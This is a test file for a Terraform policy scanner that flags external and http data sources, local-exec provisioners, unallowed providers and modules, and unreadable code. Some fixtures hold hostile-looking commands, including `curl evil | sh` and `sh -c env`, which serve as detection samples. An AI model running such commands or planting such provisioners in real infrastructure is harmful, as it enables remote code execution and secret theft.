/** The scan over real directories: a root of .tf / .tf.json files in a temp dir. */
import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { dirname, join } from "path";
import { parseInfraPolicyConfig } from "./config.js";
import { agentMessage, scanRoot, type ScanResult } from "./scan.js";

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function tree(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "infra-policy-"));
  dirs.push(root);
  for (const [name, text] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, text);
  }
  return join(root, "stack");
}

function scan(files: Record<string, string>, config: Record<string, unknown> = {}): ScanResult {
  const root = tree({ ...files });
  mkdirSync(root, { recursive: true });
  const parsed = parseInfraPolicyConfig({ enabled: true, roots: [root], allowed_providers: ["hashicorp/aws"], ...config });
  if (!parsed.ok) throw new Error(parsed.errors.join("; "));
  return scanRoot(root, parsed.settings);
}

const rules = (r: ScanResult) => r.violations.map((v) => v.rule);
const AWS = `terraform {\n  required_providers {\n    aws = { source = "hashicorp/aws", version = "~> 5.0" }\n  }\n}\n`;

describe("scanRoot: denied blocks", () => {
  it("passes plain AWS code", () => {
    const r = scan({ "stack/main.tf": AWS + `resource "aws_s3_bucket" "logs" {\n  bucket = "logs"\n}\n` });
    expect(r).toMatchObject({ ok: true, violations: [], filesScanned: 1, modulesScanned: 1 });
  });

  it("refuses an external data source", () => {
    const r = scan({
      "stack/main.tf": AWS + `data "external" "token" {\n  program = ["sh", "-c", "env"]\n}\n`,
    });
    expect(rules(r)).toContain("denied-external-data");
    expect(r.violations.find((v) => v.rule === "denied-external-data")).toMatchObject({
      file: "main.tf",
      line: 6,
      address: "data.external.token",
    });
  });

  it("refuses an http data source", () => {
    const r = scan({ "stack/main.tf": AWS + `data "http" "ip" {\n  url = "https://example.com"\n}\n` });
    expect(rules(r)).toContain("denied-http-data");
  });

  it("refuses a local-exec provisioner on null_resource and on any other resource", () => {
    const r = scan({
      "stack/main.tf":
        AWS +
        `resource "null_resource" "x" {\n  provisioner "local-exec" {\n    command = "curl evil | sh"\n  }\n}\n` +
        `resource "aws_instance" "y" {\n  provisioner "local-exec" { command = "id" }\n}\n`,
    });
    expect(r.violations.filter((v) => v.rule === "denied-local-exec").map((v) => v.address)).toEqual([
      "null_resource.x",
      "aws_instance.y",
    ]);
  });

  it("is not fooled by comments, strings, heredocs or a renamed provider", () => {
    const r = scan({
      "stack/main.tf":
        `# data "external" "nope" {}\n/* data "http" "nope" {} */\n` +
        `terraform {\n  required_providers {\n    aws = { source = "hashicorp/aws" }\n    ex = {\n      source = "hashicorp/external"\n    }\n  }\n}\n` +
        `locals {\n  note = "data \\"http\\" \\"nope\\" {"\n  doc = <<-EOT\n    data "http" "nope" {\n  EOT\n}\n` +
        `data "ex" "renamed" {\n  program = ["x"]\n}\n`,
    });
    // the comment, string and heredoc cause nothing; the renamed external does (and its provider is not allowed)
    expect(rules(r).sort()).toEqual(["denied-external-data", "provider-not-allowed"]);
  });

  it("reads .tf.json files the same way", () => {
    const r = scan({
      "stack/main.tf.json": JSON.stringify({
        terraform: { required_providers: { aws: { source: "hashicorp/aws" } } },
        data: { external: { token: { program: ["sh"] } } },
        resource: { null_resource: { x: { provisioner: [{ "local-exec": { command: "id" } }] } } },
      }),
    });
    // external and null are not allowed providers either
    expect(rules(r).sort()).toEqual(["denied-external-data", "denied-local-exec", "provider-not-allowed", "provider-not-allowed"]);
  });

  it("lets the owner allow one use by address, and still shows it", () => {
    const code = AWS + `data "http" "health" {\n  url = "https://example.com"\n}\ndata "http" "other" {\n  url = "https://example.org"\n}\n`;
    const r = scan({ "stack/main.tf": code }, { allow: ["data.http.health"], allowed_providers: ["hashicorp/aws", "hashicorp/http"] });
    expect(r.violations.map((v) => v.address)).toEqual(["data.http.other"]);
    expect(r.allowed.map((v) => v.address)).toEqual(["data.http.health"]);
  });
});

describe("scanRoot: provider sources", () => {
  it("refuses a provider that is not in the allowlist, declared or implied", () => {
    const declared = scan({
      "stack/main.tf": `terraform {\n  required_providers {\n    evil = { source = "someone/evil" }\n  }\n}\n`,
    });
    expect(declared.violations).toMatchObject([{ rule: "provider-not-allowed", detail: expect.stringContaining("someone/evil") }]);
    const implied = scan({ "stack/main.tf": `resource "google_storage_bucket" "b" {\n  name = "b"\n}\n` });
    expect(rules(implied)).toEqual(["provider-not-allowed"]);
  });

  it("treats short and full source names as one provider", () => {
    const r = scan(
      { "stack/main.tf": `terraform {\n  required_providers {\n    aws = { source = "registry.opentofu.org/hashicorp/aws" }\n  }\n}\n` },
      { allowed_providers: ["hashicorp/aws"] },
    );
    expect(r.ok).toBe(true);
  });

  it("refuses a source that is not a plain string", () => {
    const r = scan({
      "stack/main.tf": `terraform {\n  required_providers {\n    aws = { source = var.src }\n  }\n}\n`,
    });
    expect(rules(r)).toEqual(["source-not-literal"]);
  });
});

describe("scanRoot: modules", () => {
  it("refuses a remote module that is not allowed, and accepts one that is", () => {
    const code = AWS + `module "vpc" {\n  source = "terraform-aws-modules/vpc/aws"\n  version = "5.0.0"\n}\n`;
    expect(rules(scan({ "stack/main.tf": code }))).toEqual(["module-not-allowed"]);
    expect(scan({ "stack/main.tf": code }, { allowed_modules: ["terraform-aws-modules/vpc/aws"] }).ok).toBe(true);
    const git = AWS + `module "m" {\n  source = "git::https://example.com/org/mod.git?ref=v1"\n}\n`;
    expect(rules(scan({ "stack/main.tf": git }, { allowed_modules: ["git::https://example.com/other/"] }))).toEqual(["module-not-allowed"]);
    expect(scan({ "stack/main.tf": git }, { allowed_modules: ["git::https://example.com/org/"] }).ok).toBe(true);
  });

  it("scans local modules, with the module in the address", () => {
    const r = scan({
      "stack/main.tf": AWS + `module "net" {\n  source = "./modules/net"\n}\n`,
      "stack/modules/net/main.tf": `data "http" "ip" {\n  url = "https://example.com"\n}\n`,
    });
    expect(r.modulesScanned).toBe(2);
    expect(r.violations.find((v) => v.rule === "denied-http-data")).toMatchObject({
      file: "modules/net/main.tf",
      address: "module.net.data.http.ip",
    });
  });

  it("refuses a local module outside the root, also through a symlink", () => {
    const outside = scan({
      "stack/main.tf": AWS + `module "up" {\n  source = "../elsewhere"\n}\n`,
      "elsewhere/main.tf": `data "external" "x" {\n  program = ["x"]\n}\n`,
    });
    expect(rules(outside)).toEqual(["module-outside-root"]);

    const root = tree({ "stack/main.tf": AWS + `module "l" {\n  source = "./link"\n}\n`, "elsewhere/main.tf": "" });
    symlinkSync(join(dirname(root), "elsewhere"), join(root, "link"));
    const parsed = parseInfraPolicyConfig({ enabled: true, roots: [root], allowed_providers: ["hashicorp/aws"] });
    if (!parsed.ok) throw new Error("config");
    expect(rules(scanRoot(root, parsed.settings))).toEqual(["module-outside-root"]);
  });

  it("refuses a module that calls itself instead of looping", () => {
    const r = scan({ "stack/main.tf": AWS + `module "me" {\n  source = "./"\n}\n` });
    expect(r.violations).toMatchObject([{ rule: "unreadable", detail: "module calls itself" }]);
  });
});

describe("scanRoot: fail closed", () => {
  it("refuses code it cannot read", () => {
    const r = scan({ "stack/main.tf": `resource "aws_s3_bucket" "b" {\n  bucket = "x"\n` });
    expect(r.violations).toMatchObject([{ rule: "unreadable", file: "main.tf" }]);
    expect(rules(scan({ "stack/main.tf.json": "{nope" }))).toEqual(["unreadable"]);
  });

  it("refuses a root that does not exist", () => {
    const parsed = parseInfraPolicyConfig({ enabled: true, roots: ["/nonexistent/infra"] });
    if (!parsed.ok) throw new Error("config");
    expect(rules(scanRoot("/nonexistent/infra", parsed.settings))).toEqual(["unreadable"]);
  });
});

describe("agentMessage", () => {
  it("names the rules and nothing else", () => {
    const r = scan(
      { "stack/main.tf": AWS + `data "external" "secret_name_here" {\n  program = ["x"]\n}\n` },
      { allowed_providers: ["hashicorp/aws", "hashicorp/external"] },
    );
    const message = agentMessage(r);
    expect(message).toBe("policy violation: denied-external-data");
    expect(message).not.toContain("secret_name_here");
  });
});
